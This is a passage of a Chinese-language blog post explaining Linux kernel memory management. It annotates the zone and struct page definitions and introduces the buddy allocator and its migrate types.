 * wait on pages at a given time. So instead of using</span></span><br><span class="line"><span class="comment">     * per-page waitqueues, we use a waitqueue hash table.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The bucket discipline is to sleep on the same queue when</span></span><br><span class="line"><span class="comment">     * colliding and wake all in that wait queue when removing.</span></span><br><span class="line"><span class="comment">     * When something wakes, it must check to be sure its page is</span></span><br><span class="line"><span class="comment">     * truly available, a la thundering herd. The cost of a</span></span><br><span class="line"><span class="comment">     * collision is great, but given the expected load of the</span></span><br><span class="line"><span class="comment">     * table, they should be so rare as to be outweighed by the</span></span><br><span class="line"><span class="comment">     * benefits from the saved space.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * __wait_on_page_locked() and unlock_page() in mm/filemap.c, are the</span></span><br><span class="line"><span class="comment">     * primary users of these fields, and in mm/page_alloc.c</span></span><br><span class="line"><span class="comment">     * free_area_init_core() performs the initialization of them.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/*  进程等待队列的散列表, 这些进程正在等待管理区中的某页  */</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span>       *wait_table;</span><br><span class="line">    <span class="comment">/*  等待队列散列表中的调度实体数目  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       wait_table_hash_nr_entries;</span><br><span class="line">    <span class="comment">/*  等待队列散列表数组大小, 值为2^order  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       wait_table_bits;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free areas of different sizes</span></span><br><span class="line"><span class="comment">       页面使用状态的信息，以每个bit标识对应的page是否可以分配</span></span><br><span class="line"><span class="comment">       是用于伙伴系统的，每个数组元素指向对应阶也表的数组开头</span></span><br><span class="line"><span class="comment">       以下是供页帧回收扫描器(page reclaim scanner)访问的字段</span></span><br><span class="line"><span class="comment">       scanner会跟据页帧的活动情况对内存域中使用的页进行编目</span></span><br><span class="line"><span class="comment">       如果页帧被频繁访问，则是活动的，相反则是不活动的，</span></span><br><span class="line"><span class="comment">       在需要换出页帧时，这样的信息是很重要的：   */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>    <span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone flags, see below 描述当前内存的状态, 参见下面的enum zone_flags结构 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Write-intensive fields used from the page allocator, 保存该描述符的自旋锁  */</span></span><br><span class="line">    <span class="type">spinlock_t</span>          lock;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Write-intensive fields used by page reclaim */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fields commonly accessed by the page reclaim scanner */</span></span><br><span class="line">    <span class="type">spinlock_t</span>          lru_lock;   <span class="comment">/* LRU(最近最少使用算法)活动以及非活动链表使用的自旋锁  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lruvec</span>       <span class="title">lruvec</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * When free pages are below this point, additional steps are taken</span></span><br><span class="line"><span class="comment">     * when reading the number of free pages to avoid per-cpu counter</span></span><br><span class="line"><span class="comment">     * drift allowing watermarks to be breached</span></span><br><span class="line"><span class="comment">     * 在空闲页的数目少于这个点percpu_drift_mark的时候</span></span><br><span class="line"><span class="comment">     * 当读取和空闲页数一样的内存页时，系统会采取额外的工作，</span></span><br><span class="line"><span class="comment">     * 防止单CPU页数漂移，从而导致水印被破坏。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> percpu_drift_mark;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/* pfn where compaction free scanner should start */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       compact_cached_free_pfn;</span><br><span class="line">    <span class="comment">/* pfn where async and sync compaction migration scanner should start */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       compact_cached_migrate_pfn[<span class="number">2</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span></span><br><span class="line"><span class="comment">     * are skipped before trying again. The number attempted since</span></span><br><span class="line"><span class="comment">     * last failure is tracked with compact_considered.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        compact_considered;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        compact_defer_shift;</span><br><span class="line">    <span class="type">int</span>                       compact_order_failed;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span></span><br><span class="line">    <span class="type">bool</span>            compact_blockskip_flush;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span>            contiguous;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad3_)</span><br><span class="line">    <span class="comment">/* Zone statistics 内存域的统计信息, 参见后面的enum zone_stat_item结构 */</span></span><br><span class="line">    <span class="type">atomic_long_t</span>       vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>剩下的内容太复杂了，不再赘述。总结参看下方链接即可。总的来讲，“区”只是一种逻辑上的分组，方便操作系统按一定的结构和顺序去管理页的分配。并不是一种物理上的强制措施。</p><blockquote><p>参考<a href="https://www.cnblogs.com/linhaostudy/p/10006723.html#autoid-6-4-0">https://www.cnblogs.com/linhaostudy/p/10006723.html#autoid-6-4-0</a></p></blockquote><h2 id="什么是页框？">什么是页框？</h2><blockquote><p><a href="https://blog.csdn.net/gatieme/article/details/52384636">https://blog.csdn.net/gatieme/article/details/52384636</a><br>这应该是一个大佬一系列的文章</p></blockquote><p>终于到了我们熟悉的内容，区下面管理的就是一个个页框了。linux也用一个结构体管理物理page frame叫做<code>struct page</code>。考虑到大量的page数量，page结构要尽量的小，因此这个结构里使用了大量的联合体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Each physical page in the system has a struct page associated with</span></span><br><span class="line"><span class="comment"> * it to keep track of whatever it is we are using the page for at the</span></span><br><span class="line"><span class="comment"> * moment. Note that we have no way to track which tasks are using</span></span><br><span class="line"><span class="comment"> * a page, though if it is a pagecache page, rmap structures can tell us</span></span><br><span class="line"><span class="comment"> * who is mapping it.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The objects in struct page are organized in double word blocks in</span></span><br><span class="line"><span class="comment"> * order to allows us to use atomic double word operations on portions</span></span><br><span class="line"><span class="comment"> * of struct page. That is currently only used by slub but the arrangement</span></span><br><span class="line"><span class="comment"> * allows the use of atomic double word operations on the flags/mapping</span></span><br><span class="line"><span class="comment"> * and lru list pointers also.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="comment">/* First double word block */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;        <span class="comment">/* Atomic flags, some possibly updated asynchronously</span></span><br><span class="line"><span class="comment">                                              描述page的状态和其他信息  */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span>  <span class="comment">/* If low bit clear, points to</span></span><br><span class="line"><span class="comment">                         * inode address_space, or NULL.</span></span><br><span class="line"><span class="comment">                         * If page mapped as anonymous</span></span><br><span class="line"><span class="comment">                         * memory, low bit is set, and</span></span><br><span class="line"><span class="comment">                         * it points to anon_vma object:</span></span><br><span class="line"><span class="comment">                         * see PAGE_MAPPING_ANON below.</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">        <span class="type">void</span> *s_mem;            <span class="comment">/* slab first object 现移动至struct slab结构体*/</span> </span><br><span class="line">        <span class="type">atomic_t</span> compound_mapcount;     <span class="comment">/* first tail page */</span></span><br><span class="line">        <span class="comment">/* page_deferred_list().next     -- second tail page */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Second double word */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            <span class="type">pgoff_t</span> index;      <span class="comment">/* Our offset within mapping.</span></span><br><span class="line"><span class="comment">            在映射的虚拟空间（vma_area）内的偏移；</span></span><br><span class="line"><span class="comment">            一个文件可能只映射一部分，假设映射了1M的空间，</span></span><br><span class="line"><span class="comment">            index指的是在1M空间内的偏移，而不是在整个文件内的偏移。 */</span></span><br><span class="line">            <span class="type">void</span> *freelist;     <span class="comment">/* sl[aou]b first free object */</span></span><br><span class="line">            <span class="comment">/* page_deferred_list().prev    -- second tail page */</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_HAVE_CMPXCHG_DOUBLE) &amp;&amp; \</span></span><br><span class="line"><span class="meta">    defined(CONFIG_HAVE_ALIGNED_STRUCT_PAGE)</span></span><br><span class="line">            <span class="comment">/* Used for cmpxchg_double in slub */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Keep _refcount separate from slub cmpxchg_double</span></span><br><span class="line"><span class="comment">             * data.  As the rest of the double word is protected by</span></span><br><span class="line"><span class="comment">             * slab_lock but _refcount is not.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">unsigned</span> counters;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">                <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Count of ptes mapped in mms, to show</span></span><br><span class="line"><span class="comment">                     * when page is mapped &amp; limit reverse</span></span><br><span class="line"><span class="comment">                     * map searches.</span></span><br><span class="line"><span class="comment">                     * 页映射计数器</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="type">atomic_t</span> _mapcount;</span><br><span class="line"></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* SLUB */</span></span><br><span class="line">                        <span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">                        <span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">                        <span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">                    &#125;;</span><br><span class="line">                    <span class="type">int</span> units;      <span class="comment">/* SLOB */</span></span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Usage count, *USE WRAPPER FUNCTION*</span></span><br><span class="line"><span class="comment">                 * when manual accounting. See page_ref.h</span></span><br><span class="line"><span class="comment">                 * 页引用计数器</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="type">atomic_t</span> _refcount;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> active;    <span class="comment">/* SLAB */</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Third double word block</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * WARNING: bit 0 of the first word encode PageTail(). That means</span></span><br><span class="line"><span class="comment">     * the rest users of the storage space MUST NOT use the bit to</span></span><br><span class="line"><span class="comment">     * avoid collision and false-positive PageTail().</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span>   <span class="comment">/* Pageout list, eg. active_list</span></span><br><span class="line"><span class="comment">                     * protected by zone-&gt;lru_lock !</span></span><br><span class="line"><span class="comment">                     * Can be used as a generic list</span></span><br><span class="line"><span class="comment">                     * by the page owner.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span> <span class="comment">/* ZONE_DEVICE pages are never on an</span></span><br><span class="line"><span class="comment">                        * lru or handled by a slab</span></span><br><span class="line"><span class="comment">                        * allocator, this points to the</span></span><br><span class="line"><span class="comment">                        * hosting device page map.</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>        <span class="comment">/* slub per cpu partial pages */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span>      <span class="comment">/* Next partial slab */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">            <span class="type">int</span> pages;      <span class="comment">/* Nr of partial slabs left */</span></span><br><span class="line">            <span class="type">int</span> pobjects;   <span class="comment">/* Approximate # of objects */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="type">short</span> <span class="type">int</span> pages;</span><br><span class="line">            <span class="type">short</span> <span class="type">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span>       <span class="comment">/* Used by SLAB</span></span><br><span class="line"><span class="comment">                         * when destroying via RCU</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">        <span class="comment">/* Tail pages of compound page */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> compound_head; <span class="comment">/* If bit zero is set */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* First tail page only */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * On 64 bit system we have enough space in struct page</span></span><br><span class="line"><span class="comment">             * to encode compound_dtor and compound_order with</span></span><br><span class="line"><span class="comment">             * unsigned int. It can help compiler generate better or</span></span><br><span class="line"><span class="comment">             * smaller code on some archtectures.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> compound_dtor;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> compound_order;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> compound_dtor;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> compound_order;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_TRANSPARENT_HUGEPAGE) &amp;&amp; USE_SPLIT_PMD_PTLOCKS</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> __pad;    <span class="comment">/* do not overlay pmd_huge_pte</span></span><br><span class="line"><span class="comment">                         * with compound_head to avoid</span></span><br><span class="line"><span class="comment">                         * possible bit 0 collision.</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">            <span class="type">pgtable_t</span> pmd_huge_pte; <span class="comment">/* protected by page-&gt;ptl */</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Remainder is not double word aligned */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> private;      <span class="comment">/* Mapping-private opaque data:</span></span><br><span class="line"><span class="comment">                         * usually used for buffer_heads</span></span><br><span class="line"><span class="comment">                         * if PagePrivate set; used for</span></span><br><span class="line"><span class="comment">                         * swp_entry_t if PageSwapCache;</span></span><br><span class="line"><span class="comment">                         * indicates order in the buddy</span></span><br><span class="line"><span class="comment">                         * system if PG_buddy is set.</span></span><br><span class="line"><span class="comment">                         * 私有数据指针，由应用场景确定其具体的含义</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_SPLIT_PTE_PTLOCKS</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ALLOC_SPLIT_PTLOCKS</span></span><br><span class="line">        <span class="type">spinlock_t</span> *ptl;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="type">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span>  <span class="comment">/* SL[AU]B: Pointer to slab */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">mem_cgroup</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * On machines where all RAM is mapped into kernel address space,</span></span><br><span class="line"><span class="comment">     * we can simply calculate the virtual address. On machines with</span></span><br><span class="line"><span class="comment">     * highmem some memory is mapped into kernel virtual memory</span></span><br><span class="line"><span class="comment">     * dynamically, so we need a place to store that address.</span></span><br><span class="line"><span class="comment">     * Note that this field could be 16 bits on x86 ... ;)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Architectures with slow multiplication can define</span></span><br><span class="line"><span class="comment">     * WANT_PAGE_VIRTUAL in asm/page.h</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">    <span class="type">void</span> *virtual;          <span class="comment">/* Kernel virtual address (NULL if</span></span><br><span class="line"><span class="comment">                       not kmapped, ie. highmem) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KMEMCHECK</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kmemcheck wants to track the status of each byte in a page; this</span></span><br><span class="line"><span class="comment">     * is a pointer to such a status block. NULL if not tracked.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">void</span> *shadow;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> LAST_CPUPID_NOT_IN_PAGE_FLAGS</span></span><br><span class="line">    <span class="type">int</span> _last_cpupid;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The struct page can be forced to be double word aligned so that atomic ops</span></span><br><span class="line"><span class="comment"> * on double words work. The SLUB allocator can make use of such a feature.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HAVE_ALIGNED_STRUCT_PAGE</span></span><br><span class="line">    __aligned(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>在较低版本的内核中，slab没有单独的结构体，全部都是集成到page中的。后续由于空间和可读性的原因将slab单独抽了出来。page结构内部还是有相当多的slab有关字段，以及标识页面所属和属性的标志位。</p><h1>Buddy System——伙伴系统</h1><blockquote><p>attrnba3大佬的博客 <a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#%E4%B8%89%E3%80%81buddy-system">https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#三、buddy-system</a></p></blockquote><p>Buddy System是linux内核以内存页为粒度的一种底层管理机制。在一个zone中会有一个free_area数组用来存储页面，一般大小为11。这个数组就是给buddy system管理用的。</p><p>buddy system本质上也是为了解决频繁内存分配的问题而生的。因为其实理论上我们有page后就可以进行分配了，但是这会面临相当多的问题，最重要的一个问题之一就是碎片。碎片分为内部碎片和外部碎片，外部碎片指的是页碎片，分配3个，释放第一个，这样再次分配大于1的页面第一页就永远不会被用到。内部碎片则是指页内碎片，比如我只需要很少的字节却分配4k的页面导致大量内存闲置。而buddy system就是为了解决外部碎片而生的。下面所说的slab/slob则是为了解决内部碎片而生的。</p><p>buddy system给出了一种很聪明的管理方案，它将物理内存页按照不同的数量（2的幂次）划分连续的块进行分配并用一个数组进行管理。比如free_area[0]就是单个page连接的链表，而free_area[1]则是每个元素由两个物理连续的page构成的链表，依此类推。</p><p><img src="/images/linux_mem/buddy_system.png" alt="buddy_system.png"></p><p>同时，buddy system将页标识为了不同的属性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">MIGRATE_UNMOVABLE,</span><br><span class="line">MIGRATE_MOVABLE,</span><br><span class="line">MIGRATE_RECLAIMABLE,</span><br><span class="line">MIGRATE_PCPTYPES,<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment"> * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment"> * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment"> * __free_pageblock_cma() function.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">MIGRATE_ISOLATE,<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这些属性如下：</p><blockquote><ul 